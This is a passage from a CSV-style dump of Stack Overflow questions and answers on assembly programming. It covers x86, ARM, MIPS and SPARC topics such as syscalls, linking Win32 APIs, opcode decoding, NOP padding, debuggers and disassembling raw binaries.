<pre><code>objconv -fnasm main.o
</code></pre>

<p>The result will be stored in <code>main.asm</code>.</p></li>
<li><p>The result will be very close to Nasm syntax. However you might need to make some minor tweaks to eliminiate warnings/errors. Simply try to compile it with Nasm</p>

<pre><code>nasm -f elf32 main.asm
</code></pre>

<p>and fix the errors/warnings by hand. For example:</p>

<ul>
<li>remove the <code>align=N</code> and <code>execute</code>/<code>noexecute</code> words from <code>.SECTION</code> lines.</li>
<li>remove the text <code>: function</code> from <code>global</code> declarations</li>
<li>remove the <code>default rel</code> line</li>
<li>remove empty sections if you wish etc</li>
</ul></li>
<li><p>Link the resulting <code>main.o</code> which generated by Nasm in step 3 using gcc:</p>

<pre><code>gcc main.o
</code></pre>

<p>You can also link it using ld but it's much harder.</p></li>
</ol>
","20743090"
"How to print a number in ARM assembly?","9689","","<p>I am trying to print a number that I have stored.  I'm not sure if I am close or way off.  Any help would be appreciated though.  Here is my code:</p>

<pre><code>.data
.balign 4
a: .word 4

.text
.global main
main:
        ldr r0, addr_of_a
        mov r1, #8
        str r1, [r0]
write:
        mov r0, #1
        ldr r1, addr_of_a
        mov r2, #4
        mov r7, #4
        swi #0
        bx lr

addr_of_a: .word a
</code></pre>

<p>It compiles and runs, but I don't see anything printed.  From what I understand,  I need the address of where to start printing in r1, how many bytes in r2, the file descriptor in r0, and r7 specifies the write call if it is set to #4.  I am simply trying to store #8, then print the stored number.</p>
","<p>The syscall write takes on the second argument (r1) a pointer to the string you want to print. You are passing to it a pointer to an integer. That's why it's not printing anything, because there are no ASCII characters on the memory region you are passing to it. </p>

<p>Below you'll find a ""Hello World"" program using the syscall write.</p>

<pre><code>.text
.global main
main:
        push {r7, lr}

        mov r0, #1
        ldr r1, =string
        mov r2, #20
        mov r7, #4
        svc #0

        pop {r7, pc}

.data
string: .asciz ""Hello World\n""
</code></pre>

<p>If you want to print a number you can use the printf function from the C library. Like this:</p>

<pre><code>.text
.global main
.extern printf
main:
        push {ip, lr}

        ldr r0, =string
        mov r1, #1024
        bl printf

        pop {ip, pc}

.data
string: .asciz ""The number is: %d\n""
</code></pre>

<p>Finally, if you want to print the number with the syscall write you can also implement a itoa function (one that converts an integer to a string).</p>
","17364387"
"error LNK2001: unresolved external symbol _MessageBox","9685","","<p>I am trying to create a helloworld program using only masm and not masm32 libs. Here is the code snippet:</p>

<pre><code>.386
.model flat, stdcall
option casemap :none

extrn MessageBox : PROC
extrn ExitProcess : PROC

.data
        HelloWorld db ""Hello There!"", 0

.code
start:

        lea eax, HelloWorld
        mov ebx, 0
        push ebx
        push eax
        push eax
        push ebx
        call MessageBox
        push ebx
        call ExitProcess

end start
</code></pre>

<p>I am able to assemble this using masm:</p>

<pre><code>c:\masm32\code&gt;ml /c /coff demo.asm
Microsoft (R) Macro Assembler Version 9.00.21022.08
Copyright (C) Microsoft Corporation.  All rights reserved.

 Assembling: demo.asm
</code></pre>

<p>However, I am unable to link it:</p>

<pre><code>c:\masm32\code&gt;link /subsystem:windows /defaultlib:kernel32.lib /defaultlib:user
32.lib demo.obj
Microsoft (R) Incremental Linker Version 9.00.21022.08
Copyright (C) Microsoft Corporation.  All rights reserved.

demo.obj : error LNK2001: unresolved external symbol _MessageBox
demo.obj : error LNK2001: unresolved external symbol _ExitProcess
demo.exe : fatal error LNK1120: 2 unresolved externals
</code></pre>

<p>I am including the libs during linking, so not sure why it still says unresolved symbols? </p>

<p>UPDATE:</p>

<pre><code>c:\masm32\code&gt;link /subsystem:windows /defaultlib:kernel32.lib /defaultlib:user
32.lib demo.obj
Microsoft (R) Incremental Linker Version 9.00.21022.08
Copyright (C) Microsoft Corporation.  All rights reserved.

demo.obj : error LNK2001: unresolved external symbol _MessageBox@16
demo.exe : fatal error LNK1120: 1 unresolved externals
</code></pre>

<p><strong>UPDATE 2: Final working code!</strong> </p>

<pre><code>.386
.model flat, stdcall
option casemap :none

extrn MessageBoxA@16 : PROC
extrn ExitProcess@4 : PROC

.data
        HelloWorld db ""Hello There!"", 0

.code
start:

        lea eax, HelloWorld
        mov ebx, 0
        push ebx
        push eax
        push eax
        push ebx
        call MessageBoxA@16
        push ebx
        call ExitProcess@4

end start
</code></pre>
","<p>The correct function names are <code>MessageBoxA@16</code> and <code>ExitProcess@4</code>.</p>

<p>Almost all Win32 API functions are stdcall, so <a href=""http://msdn.microsoft.com/en-us/library/zxk0tw93.aspx"" rel=""noreferrer"">their names are decorated</a> with an <code>@</code> sign, followed by the number of bytes taken up by their parameters.</p>

<p>Additionally, when a Win32 function takes a string, there are two variants: one that takes an ANSI string (name ends in <code>A</code>) and one that takes a Unicode string (name ends in <code>W</code>). You're supplying an ANSI string, so you want the <code>A</code> version.</p>

<p>When you're not programming in assembly the compiler takes care of these points for you.</p>
","4123035"
"Why we cant compare (bne-beq) a register with an immediate (Assembly-MIPS)?","9678","","<p>For example on add we have addi for adding a register and an immediate,why on this case we cant have bnei or beqi...</p>

<p>Im supposed to answer on that,but im not sure...any help? </p>
","<p>The reason is the instruction encoding:</p>

<p>Both <code>ADDI</code> and <code>BNE/BEQ</code> are <a href=""http://en.wikipedia.org/wiki/MIPS_architecture#MIPS_I_instruction_formats"" rel=""nofollow"">I-Type instructions</a>. But whereas the immediate field in the <code>ADDI</code> instruction is used for storing the immediate operand for the addition, it's used for storing the branch offset in the case of <code>BEQ/BNE</code>.</p>

<p>There may be MIPS assemblers which allow you to use immediate operands in conditional branch instructions, but they will expand those <em>pseudo-instructions</em> into multiple actual instructions.</p>
","16760393"
"How to interpret the opcode manually?","9663","","<pre><code>77f4bcbc 8945fc          mov     dword ptr [ebp-4],eax
</code></pre>

<p>And here's the rule:</p>

<pre><code>88  /r   MOV r/m8,r8       2/2           Move byte register to r/m byte
89  /r   MOV r/m16,r16     2/2           Move word register to r/m word
89  /r   MOV r/m32,r32     2/2           Move dword register to r/m dword
</code></pre>

<p>How to interpret <code>8945fc</code> to <code>mov     dword ptr [ebp-4],eax</code>?</p>
","<p>We have here a three-byte instruction: 89 45 fc. The first byte is the opcode byte. Looking it up in the table, we can see that it's a MOV instruction and it takes a Mod R/M byte. The Mod R/M byte has the following layout:</p>

<pre><code> 7  6   5  4  3   2  1  0
+-----+---------+---------+
| Mod |   Reg   |   R/M   | 
+-----+---------+---------+
</code></pre>

<p>Let's look at the second byte of the instruction. 0x45 is 01.000.101 in binary. Thus, Mod is 01, Reg is 000 and R/M is 101.</p>

<p>Looking up in the reference, e.g. <a href=""http://www.sandpile.org/ia32/opc_rm32.htm"" rel=""noreferrer"">here</a>, we can see that the combination of Mod=01 and R/M=101 corresponds to the [EBP+sbyte] operand. The ""sbyte"" is an 8-bit signed displacement which is encoded in the third byte: 0xFC. Since the displacement is signed, it has to be interpreted as such number, i.e. -4.</p>

<p>The ""/r"" note next to the instruction tells us that the register (second) operand is specified by the Reg field of the instruction. Reg=000 is al/ax/eax. Assuming a 32-bit mode by default, this will mean eax.</p>

<p>Assembling all of the above, we get</p>

<pre><code>MOV [EBP-4], EAX
</code></pre>
","6020143"
"Are instruction set and assembly language the same thing?","9651","","<p>I was wondering if <a href=""http://en.wikipedia.org/wiki/Instruction_set"">instruction set</a> and <a href=""http://en.wikipedia.org/wiki/Assembly_language"">assembly language</a> are the same thing? </p>

<p>If not, how do they differ and what are their relations?</p>

<p>Thanks and regards!</p>
","<p>I think everyone is giving you the same answer.  Instruction set is is the set (as in math) of all instructions the processor can execute or understand.   Assembly language is a programming language.   </p>

<p>Let me try some examples based on some of the questions you are asking.  And I am going to be jumping around from processor to processor with whatever code I have handy.</p>

<p>Instruction or opcode or binary or machine language, whatever term you want to use for the bits/bytes that are loaded into the processor to be decoded and executed.  An example </p>

<pre><code>0x5C0B
</code></pre>

<p>The assembly language, would be</p>

<pre><code>add r12,r11
</code></pre>

<p>For this particular processor.  In this case that means r11 = r11 + r12.  So I put that text, the add r12,r11 in a text file and use an assembler (a program that compiles/assembles assembly language) to assemble it into some form of binary.  Like any programming language sometimes you create object files then link them together, sometimes you can go straight to a binary.  And there are many forms of binaries which are in ascii and binary forms and a whole other discussion.</p>

<p>Now what can you do in assembler that is not part of the instruction set?  How do they differ?  Well for starters you can have macros:</p>

<pre><code>.macro add3 arg1, arg2, arg3

    add \arg1,\arg3
    add \arg2,\arg3

.endm


.text

   add3 r10,r11,r12
</code></pre>

<p>Macros are like inline functions, they are not functions that are called but generate code in line.  No different than a C macro for example.  So you might use them to save some typing or you might use them to abstract something that you want to do over and over again and want the ability to change in one place and not have to touch every instance.  The above example essentially generates this:</p>

<pre><code>add r10,r12
add r11,r12
</code></pre>

<p>Another difference between the instruction set and assembly langage are pseudo instructions, for this particular instruction set for example there is no pop instruction for popping things off the stack at least not by that name, and I will explain why.  But you are allowed to save some typing and use a pop in your code:</p>

<pre><code>pop r12
</code></pre>

<p>The reason why there is no pop is because the addressing modes are flexible enough to have a read from the address in the source register put the value in the destination register and increment the source register by a word.  Which in assembler for this instruction set is</p>

<pre><code>mov @r1+,r12
</code></pre>

<p>both the pop and the mov result in the opcode 0x413C.</p>

<p>Another example of differences between the instruction set and assembler, switching instruction sets, is something like this:</p>

<pre><code>ldr r0,=bob
</code></pre>

<p>Which to this assembly language means load the address of bob into register 0, there is no instruction for that, what the assembler does with it is generate something that would look like this if you were to write it in assembler by hand:</p>

<pre><code>ldr r0,ZZ123
...
ZZ123: .word bob
</code></pre>

<p>Essentially, in a reachable place from that instruction, not in the execution path, a word is created which the linker will fill in with the address for bob.  The ldr instruction likewise by the assembler or linker will get encoded with an ldr of a pc relative instruction.   </p>

<p>That leads to a whole category of differences between the instruction set and the assembly language</p>

<pre><code>call fun
</code></pre>

<p>Machine code has no way of knowing what fun is or where to find it.  For this instruction set with its many addressing modes (note I am specifically and intentionally avoiding naming the instruction sets I am using as that is not relevant to the discussion) the assembler or linker as the case may be (depending on where the fun function ends up being relative to this instruction).</p>

<p>The assembler may choose to encode that instruction as pc relative, if the fun function is 40 bytes ahead of the call instruction it may encode it with the equivalent of call pc+36 (take four off because the pc is one instruction ahead at execution time and this is a 4 byte instruction).</p>

<p>Or the assembler may not know where or what fun is and leave it up to the linker, and in that case the linker may put the absolute address of the function something that would be similar to call #0xD00D.</p>

<p>Same goes for loads and stores, some instruction sets have near and far pc relative, some have absolute address, etc.  And you may not care to choose, you may just say </p>

<pre><code>mov bob,r1 
</code></pre>

<p>and the assembler or linker or a combination of the two takes care of the rest.</p>

<p>Note that for some instruction sets the assembler and linker may happen at once in one program.  These days we are used to the model of compiling to objects and then linking objects, but not all assemblers follow that model.</p>

<p>Some more cases where the assembly language can take some shortcuts:</p>

<pre><code>hang: b hang
  b .
  b 2f
1:
  b 1b
  b 1f
1:
  b 1b
2:
</code></pre>

<p>The hang: b hang makes sense, branch to the label called hang.  Essentially a branch to self.   And as the name implies this is an infinite loop.  But for this assembly language b . means branch to self, an infinite loop but I didnt have to invent a label, type it and branch to it.  Another shortcut is using numbers  b 1b means branch to 1 back, the assembler looks for the label number 1 behind or above the instruction.  The b 1f, which is not a branch to self, means branch 1 forward, this is perfectly valid code for this assembler.  It will look forward or below the line of code for a label number 1:  And you can re-use number 1 like crazy in your assembly language program for this assembler, saves on having to invent label names for simple short branches.  The second b 1b branches to the second 1.  and is a branch to self.</p>

<p>It is important to understand that the company that created the processor defines the instruction set, and the machine code or opcodes or whatever term they or you use for the bits and bytes the processor decodes and executes.  Very often that company will produce a document with assembly language for those instructions, a syntax.  Often that company will produce an assembler program to compile/assemble that assembly language...using that syntax.  But that doesnt mean that any other person on the planet that chooses to write an assembler for that instruction set has to use that syntax.  This is very evident with the x86 instruction set.  Likewise any psuedo instructions like the pop above or macro syntax or other short cuts like the b 1b have to be honored from one assembler to another.  And very often are not, you see this with ARM for example the universal comment symbol of ; does not work with gnu assembler you have to use @ instead.  ARMs assembler does use the ; (note I write my arm assembler with ;@ to make it portable).  It gets even worse with gnu tools for example you can can put C language things like #define and /* comment */ in your assembler and use the C compiler instead of the assembler and it will work.  I prefer to stay as pure as I can for maximum portability, but naturally you may choose to use whatever features the tool offers.</p>
","5384544"
"How Can I Store a String in MIPS using Dynamic Memory?","9612","","<p>Okay guys, basically the problem I'm having is this.</p>

<p>I've been assigned to write a MIPS program that stores a struct dynamically.</p>

<p>Basically, it stores an ID, a Year, a Title, and a Description
It's to be stored using a binary search tree.</p>

<p>If you've ever coded a stack in C++ you know what I'm talking about.
I've successfully stored the ID and Titles in memory dynamically,
but I'm having trouble storing the user-entered strings.</p>

<p>This is a complex question and there's not a lot of info that I've
been able to find online so props if you can help me out with this :)</p>

<p>Here is my memory setup:</p>

<p>$s5 - Stores Root Node</p>

<p>$s7 - Stores Size of Tree (Not Necessary)</p>

<p>Each New Item Contains a chunk of 344 bytes</p>

<p>The bytes are setup as such:</p>

<p>8 Bytes - [ID]</p>

<p>8 Bytes - [Year]</p>

<p>64 Bytes - [Title]</p>

<p>256 Bytes - [Description]</p>

<p>8 Bytes - [LastNodeAddress]</p>

<p>8 Bytes - [NextNodeAddress]</p>

<p>Here's the code and you may see the issue:</p>

<pre><code>li $v0, 9           #allocate memory for new record
li $a0, 344         #enough memory for 2 addresses and all the data
syscall


move $s0, $v0           #hang onto the initial address of all our info

li $v0, 4           #prompt for ID
la $a0, addid
syscall

li $v0, 5           #enter integer
syscall

sw $v0, 0($s0)          #store our ID into memory   Offset: 0

li $v0, 4           #prompt for add year
la $a0, addyear
syscall

li $v0, 5           #enter integer
syscall

sw $v0, 4($s0)          #store year into our memory Offset: 4

li $v0, 4           #prompt for add title
la $a0, addtitle
syscall

li $v0, 8           #read title into titlebuffer
la $a0, titlebuffer
li $a1, 64
syscall

sw $a0, 8($s0)          #store title into our memory    Offset: 8

li $v0, 4           #prompt for add description
la $a0, adddescription
syscall

li $v0, 8           #read from input into descriptionbuffer
la $a0, descriptionbuffer
li $a1, 256
syscall

sw $a0, 72($s0)         #store description into our memory  Offset: 72

bne $s7, 0, setlocations    #if this isn't root node let's set the locations

add $s7, $s7, 1         #add 1 to the size of the records

move $s5, $s0           #store this address as root node for now
</code></pre>

<p>The problem is that all that's being stored is the address of the buffers.
The buffers are defined in my data section like this:</p>

<pre><code>.data
titlebuffer: .space 64
descriptionbuffer: .space 256
</code></pre>

<p>What I end up with is just the addresses stored in the memory I allocated,
and I have no idea how to store strings into allocated memory.</p>

<p>Any help would be greatly appreciated! :)</p>
","<p>Don't bother defining your memory at the start of your program like I showed in the original question.</p>

<p>Instead, allocate it and read the values into the correct offsets of your dynamic memory.</p>

<p>Instead of <code>la $a0, descriptionbuffer</code></p>

<p>Instead of <code>la $a0, titlebuffer</code></p>

<p>Use:</p>

<p><code>la $a0, 8($s0)</code></p>

<p><code>la $a0, 72($s0)</code></p>

<p>Here I move the memory address into <code>$s0</code> using <code>move $s0, $v0</code> and read the values into the correct offsets.</p>

<p>to print you do the same thing!</p>

<p>Here is the working code:</p>

<pre><code>li $v0, 9           #allocate memory for new record
li $a0, 344         #enough memory for 2 addresses and all the data
syscall

move $s0, $v0           #hang onto the initial address of all our info

li $v0, 8           #read our title into the allocated space
la $a0, 8($s0)          #Offset: 8
li $a1, 64
syscall

li $v0, 8           #read our description into the allocated space
la $a0, 72($s0)         #Offset: 72
li $a1, 256
syscall 
</code></pre>

<p>In addition, you can find the final solution here: <a href=""https://stackoverflow.com/a/9953839/1274820"">https://stackoverflow.com/a/9953839/1274820</a></p>
","9953788"
"Push and Pop in arm","9603","","<p>I don't really understand how stack commands or how stacks in general work.</p>

<p>Say if I had</p>

<pre><code>PUSH R3
POP R3
</code></pre>

<p>Line 1 : Does this mean that the content of R3 would be put onto the top of the stack? Would the contents of the stack then change if R3 changed?</p>

<p>Line 2: On the second line, would the contents at the top of the stack be moved from the stack into R3 OR is the contents of R3 that was pushed onto the stack popped off the stack?</p>

<p>Also what does pop/push do when a register is surrounded in brackets like so</p>

<pre><code>POP {LR}
</code></pre>
","<p>The mentioned stack operations are only shortcuts for memory operations using <code>sp</code> in the address part. E.g.</p>

<pre><code>PUSH {r3}
POP {r3}
</code></pre>

<p>are aliases for</p>

<pre><code>str r3, [sp, #-4]!
ldr r3, [sp], #4
</code></pre>

<p>First operation says ""store content of <code>r3</code> into <code>[sp - #4]</code> and decrement <code>sp</code> by 4"".  Last one ""load <code>r3</code> from <code>[sp]</code> and increment <code>sp</code> by 4"".</p>

<p>Instead of <code>{r3}</code> you can use any other register or register sets (e.g. <code>{r1,r2,r3,lr}</code>.  Register sets are specified in a bitmask in the machine code so you can not influence the order in which the registers are stored/loaded.</p>
","27095517"
"x86 Assembly Language - Terminate Program","9592","","<p>I am sure this is very trivial for most, but I am not very familiar with x86 assembly language. I am just trying to teach myself.</p>

<p>I am in windows. And everywhere I read, I was told to use <code>INT 21</code> to return to the operating system. Which this exits the program, but I get an error saying <code>Unhandled exception at 0x003d1313 in Assignment1.exe: 0xC0000005: Access violation reading location 0xffffffff</code>.</p>

<p>Thanks!</p>
","<p>On Windows, if you are using a formal assembler (e.g. MASM), you can simply call the following:</p>

<pre><code>.386 
.model flat, stdcall 
option casemap:none 
include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib 
.data 
.code 
start: 
        invoke ExitProcess,0 
end start
</code></pre>

<p>If you are not using any assembler and want to simply execute a chunk of binary code, execute the following:</p>

<pre><code>push xxx
push -1
push 0
mov eax, yyy
mov edx, 7FFE0300
call dword ptr ds:[edx]
</code></pre>

<p>where xxx is the exit code of the process and yyy is the system call number for <code>NtTerminateProcess</code> ( use <a href=""http://www.pediy.com/document/Windows_System_Call_Table/Windows_System_Call_Table.htm"" rel=""nofollow"">http://www.pediy.com/document/Windows_System_Call_Table/Windows_System_Call_Table.htm</a> to determine the call number for appropriate OS. it's 0x172 for Windows 7)</p>
","8085796"
"Linux Assembly Debugger","9582","","<p>I need a debugger for assembly on Linux. I am extremely surprised by the LACK of debuggers out there for Linux! It should have various features, such as showing the registers and what not. I would use GDB, however it isn't exactly friendly with NASM.</p>

<p>I would rather have the debugger have intel syntax however I can make a sacrifice.</p>

<p>I have tried kdb, gdb/ddd, and ald. Does anyone know of any else? Don't recommend strace, because I am going beyond syscalls!</p>
","<p>I am not sure what exactly you mean when you say that gdb is not friendly with NASM. The thing is that gdb uses AT&amp;T notation for displaying assembler. NASM uses Intel notation. There are couple of differences, which you can find on google.</p>

<p>You can configure gdb to display assembler using Intel notation. The command is set disassembly-flavor intel</p>

<p>Programs that you've tried, kdb, ddd and friends are all gdb front-ends. I.e. they present you different UI while use gdb as their back-end.</p>

<p>I think your best and perhaps the only reasonable option is gdb. Other option is to write debugger your-self, but this is quiet complicated.</p>

<p>Hope it helps.</p>
","5761216"
"AMD64 -- nopw assembly instruction?","9552","","<p>In this compiler output, I'm trying to understand how machine-code encoding of the <code>nopw</code> instruction works:</p>

<pre><code>00000000004004d0 &lt;main&gt;:
  4004d0:       eb fe                   jmp    4004d0 &lt;main&gt;
  4004d2:       66 66 66 66 66 2e 0f    nopw   %cs:0x0(%rax,%rax,1)
  4004d9:       1f 84 00 00 00 00 00
</code></pre>

<p>There is some discussion about ""nopw"" at <a href=""http://john.freml.in/amd64-nopl"" rel=""nofollow noreferrer"">http://john.freml.in/amd64-nopl</a>. Can anybody explain the meaning of 4004d2-4004e0? From looking at the opcode list, it seems that <code>66 ..</code> codes are multi-byte expansions. I feel I could probably get a better answer to this here than I would unless I tried to grok the opcode list for a few hours.</p>

<hr>

<p>That asm output is from the following (insane) code in C, which optimizes down to a simple infinite loop:</p>

<pre><code>long i = 0;

main() {
    recurse();
}

recurse() {
    i++;
    recurse();
}
</code></pre>

<p>When compiled with <code>gcc -O2</code>, the compiler recognizes the infinite recursion and turns it into an infinite loop; it does this so well, in fact, that it actually loops in the <code>main()</code> without calling the <code>recurse()</code> function.</p>

<hr>

<p>editor's note: padding functions with NOPs isn't specific to infinite loops.  Here's a set of functions with a range of lengths of NOPs, <a href=""http://gcc.godbolt.org/#compilers:!((compiler:g530,options:&#39;-xc+-std%3Dgnu11+-Wall+-Wextra++-O3+-fno-verbose-asm&#39;,source:&#39;//+14B+of+NOPs++(or+15+with+-mtune%3Dintel)%0Avoid+foo()%7B%7D++//+rep+ret+with+the+default+-march%3Dgeneric.++Just+ret+with+-mtune%3Dsandybridge+or+something%0A//+without+the+rest+of+the+file:+two+not-quite-so-long+NOPs%0A//+with+other+functions+following:+one+very-long+NOP,+like+the+OP!&#39;s+code.%0A%0A//+13B+of+NOPs%0Aint+bar()%7B+return+0%3B+%7D%0A%0A//+12B+of+NOPs%0Aint+baz(int+a)%7B+return+a+%2B+1%3B+%7D%0A%0A//+11B+of+NOP%0Along+qux(long+a)%7B+return+a+%2B+1%3B+%7D%0A&#39;)),filterAsm:(binary:!t,commentOnly:!t,directives:!t,intel:!t,labels:!t),version:3"" rel=""nofollow noreferrer"">on the Godbolt compiler explorer.</a></p>
","<p>The <code>0x66</code> bytes are an ""Operand-Size Override"" prefix. Having more than one of these is equivalent to having one.</p>

<p>The <code>0x2e</code> is a 'null prefix' in 64-bit mode (it's a CS: segment override otherwise - which is why it shows up in the assembly mnemonic).</p>

<p><code>0x0f 0x1f</code> is a 2 byte opcode for a NOP that takes a ModRM byte</p>

<p><code>0x84</code> is <a href=""http://wiki.osdev.org/X86-64_Instruction_Encoding#ModR.2FM_and_SIB_bytes"" rel=""nofollow noreferrer"">ModRM byte</a> which in this case codes for an addressing mode that uses 5 more bytes.</p>

<p>Some CPUs are slow to decode instructions with many prefixes (e.g. more than three), so a ModRM byte that specifies a SIB + disp32 is a much better way to use up an extra 5 bytes than five more prefix bytes.  </p>

<blockquote>
  <p><a href=""http://www.agner.org/optimize/microarchitecture.pdf#page=180"" rel=""nofollow noreferrer"">AMD K8 decoders in Agner Fog's microarch pdf</a>:</p>
  
  <p>Each of the instruction decoders can handle three prefixes per clock
  cycle. This means that three instructions with three prefixes each can
  be decoded in the same clock cycle. An instruction with 4 - 6 prefixes
  takes an extra clock cycle to decode.</p>
</blockquote>

<hr>

<p>Essentially, those bytes are one long NOP instruction that will never get executed anyway.  It's in there to ensure that the next function is aligned on a 16-byte boundary, because the compiler emitted a <code>.p2align 4</code> directive, so the assembler padded with a NOP.  <a href=""https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html"" rel=""nofollow noreferrer"">gcc's default for x86 is<br>
<code>-falign-functions=16</code></a>.  For NOPs that will be executed, the optimal choice of long-NOP depends on the microarchitecture.  For a microarchitecture that chokes on many prefixes, like Intel Silvermont or AMD K8, two NOPs with 3 prefixes each might have decoded faster.</p>

<p>The blog article the question linked to ( <a href=""http://john.freml.in/amd64-nopl"" rel=""nofollow noreferrer"">http://john.freml.in/amd64-nopl</a> ) explains why the compiler uses a complicated single NOP instruction instead of a bunch of single-byte 0x90 NOP instructions.</p>

<p>You can find the details on the instruction encoding in AMD's tech ref documents:</p>

<ul>
<li><a href=""http://developer.amd.com/documentation/guides/pages/default.aspx#manuals"" rel=""nofollow noreferrer"">http://developer.amd.com/documentation/guides/pages/default.aspx#manuals</a></li>
</ul>

<p>Mainly in the ""AMD64 Architecture Programmer's Manual Volume 3: General Purpose and System Instructions"".  I'm sure Intel's technical references for the x64 architecture will have the same information (and might even be more understandable).</p>
","4799185"
"assembly numbers to ascii","9550","","<p>I'm working with a program in assembly using the at&amp;t syntax on an intel.</p>

<p>I'm lost, how do I convert an integer in a register to an ascii number?</p>

<p>Lets say I want to convert the number 10 and I will put the number 10 in register %eax.
If i just add the number 48 to %eax, the ascii sign will be a :</p>

<p>I want to add 48 to the 1, and then 48 to the 0 in the number 10.
How can i do that?</p>

<p>Sample code:</p>

<pre><code>mov $10, %eax
#Cut the number in some way.
add $48, %eax
</code></pre>
","<p>To convert number into ASCII, you need to divide the number by 10 and use the remainder as result. Then add ASCII '0' and store the resulting digit. Then repeat the same with the quotient until it reaches zero.</p>

<p>However, this gives the digits in reverse order, starting from the least significant digit. You can reverse the order for example by using stack. Push each digit into stack, then pop them and store into a string buffer.</p>

<p>Something like this (not tested):</p>

<pre><code>.DATA
    strResult db 16 dup (0) ; string buffer to store results

.CODE
    mov eax, number     ; number to be converted
    mov ecx, 10         ; divisor
    xor bx, bx          ; count digits

divide:
    xor edx, edx        ; high part = 0
    div ecx             ; eax = edx:eax/ecx, edx = remainder
    push dx             ; DL is a digit in range [0..9]
    inc bx              ; count digits
    test eax, eax       ; EAX is 0?
    jnz divide          ; no, continue

    ; POP digits from stack in reverse order
    mov cx, bx          ; number of digits
    lea si, strResult   ; DS:SI points to string buffer
next_digit:
    pop ax
    add al, '0'         ; convert to ASCII
    mov [si], al        ; write it to the buffer
    inc si
    loop next_digit
</code></pre>
","9114996"
"NASM error: parser instruction expected","9543","","<pre><code> ;**********************************
 ; Boot1.asm
 ;      - A Simple Bootloader
 ;   Operating System Development
 ;**********************************

    org 0x7c00    ;BIOS loaded at 0x7c00

    bits 16       ; We are still in 16 bit real mode

     Start:
     cli      ; clear all interrupts
     hlt      ; halt the system

     times 510 - ($-$$) db 0  ;We have to be 512 bytes.Clear rest of bytes with 0

     ddw 0xAA55               ;Boot signature
</code></pre>

<p>I have written a simple boot-loader program in nasm on Windows 7 but I am getting an error: </p>

<pre><code> error:parser: instruction expected.
</code></pre>

<p>This problem has been solved previously but I am not getting it in my context.</p>
","<p>The NASM documents do not name an assembler directive <code>ddw</code>. I expect that's what the error message is talking about.  <code>ddw</code> is not an ""instruction,"" so it's confused.</p>
","25654874"
"Run Sparc binaries without Sparc hardware","9534","","<p>I've been curious in the past few months in trying my hand at doing some assembly for the SPARC processor (either V8 or V9). My question is this, I have no access to a SPARC machine, is there a way I can run SPARC binaries on my x86 machine? I've looked at QEMU but I am not too sure how to set it up.</p>
","<p><A HREF=""https://www.simics.net/"" rel=""nofollow noreferrer"">SimICS</A> emulates a Sparc platform. Academic and personal licenses are free.</p>

<p><B>Edit:</B> I didn't do SimICS justice in my initial response, it is a very useful tool for Sparc-based development. You can instrument, profile, and explore the behavior or code in both user space and kernel space. I first became aware of it about 10 years ago, when it was released by the Swedish Institute of Computer Science (SICS). They later spun it out as a commercial product.</p>
","160852"
"How do I disassemble raw MIPS code?","9530","","<p>Similarly to <a href=""https://stackoverflow.com/q/1737095/427545"">How do I disassemble raw x86 code?</a>, but then for the MIPS architecture: how do I disassemble raw MIPS code with <code>objdump</code>? I want to check the instructions in a vmlinux image, but to do so I now have to:</p>

<pre><code>: &gt; x.c
mipsel-linux-gnu-gcc -c -o x.o x.c
mipsel-linux-gnu-objcopy --add-section raw=vmlinux x.o
mipsel-linux-gnu-objcopy --remove-section .comment x.o
mipsel-linux-gnu-objdump -D x.o | less
</code></pre>

<p>Is there an easier way to do it? I've tried the below to no avail:</p>

<pre><code>mipsel-linux-gnu-objdump -b elf32-tradlittlemips -mmips -Mgpr-names=O32,cp0-names=mips1,cp0-names=mips1,hwr-names=mips1,reg-names=mips1 -D vmlinux | less
</code></pre>

<p>It just spits out:</p>

<pre><code>mipsel-linux-gnu-objdump: vmlinux: File format not recognized
</code></pre>

<p>If it helps, here is the output of some commands:</p>

<pre><code>$ file x.o
x.o: ELF 32-bit LSB relocatable, MIPS, MIPS-I version 1 (SYSV), with unknown capability 0xf41 = 0x756e6700, with unknown capability 0x70100 = 0x1040000, not stripped
$ mipsel-linux-gnu-objdump -p x.o

x.o:     file format elf32-tradlittlemips
private flags = 1006: [abi=O32] [mips1] [not 32bitmode] [PIC] [CPIC]
</code></pre>

<p>The target is an AR7 CPU.</p>
","<p>Hmm, it seems easier than that. <code>-b elf32-tradlittlemips</code> does not work because the file is not an ELF executable, but binary. So, the correct option to be used is <code>-b binary</code>. The other option, <code>-mmips</code> makes objdump recognize the file as binary for MIPS. Since the target machine is little endian, I also had to add <code>-EL</code> to make the output match the output for <code>x.o</code>.</p>

<p><code>-mmips</code> only includes the basic instruction set. The AR7 has a MIPS32 processor which <a href=""http://www.linux-mips.org/wiki/Instruction_Set_Architecture#MIPS32"" rel=""nofollow"">has more instructions</a> than just mips. To decode these newer MIPS32 instructions, use <code>-mmips:isa32</code>. A list of available ISAs can be listed with <code>objdump -i -m</code>.</p>

<p>The final command becomes:</p>

<pre><code>mipsel-linux-gnu-objdump -b binary -mmips:isa32 -EL -D vmlinux
</code></pre>

<p>This would show registers like <code>$3</code> instead of their names. To adjust that, I used the next additional options which are mentioned in <code>mipsel-linux-gnu-objdump --help</code>:</p>

<pre><code>-Mgpr-names=32,cp0-names=mips32,cp0-names=mips32,hwr-names=mips32,reg-names=mips32
</code></pre>

<p>I chose for <code>mips32</code> after reading:</p>

<ul>
<li><a href=""http://www.linux-mips.org/wiki/AR7"" rel=""nofollow"">http://www.linux-mips.org/wiki/AR7</a></li>
<li><a href=""http://www.linux-mips.org/wiki/Instruction_Set_Architecture"" rel=""nofollow"">http://www.linux-mips.org/wiki/Instruction_Set_Architecture</a></li>
</ul>
","9916524"
"Assembly commands LEA/LDS/LES","9527","","<p>What is the difference between the following commands: <code>LEA</code>, <code>LDS</code>, <code>LES</code>? I searched for the answer but I'm not very clear on it. From what I understood <code>block1</code> should be equivalent to <code>block2</code>.</p>

<pre><code>.data
  str1 db 'My first string. $'
  str2 db 'My second string. $'
  ptr_str1 dd str1 
  ptr_str2 dd str2
.code
  _block1:
  mov AX, @data
  mov DS, AX
  mov ES, AX
  lea SI, str1
  lea DI, str2

  _block2:
  lds SI, ptr_str1
  les DI, ptr_str2
</code></pre>

<p>... but when I print <code>str1</code> and <code>str1</code> using the following macro, the second block doesn't return the expected results. </p>

<pre><code>print MACRO param
    lea DX, param
    mov AH, 9
    int 21h
ENDM
</code></pre>
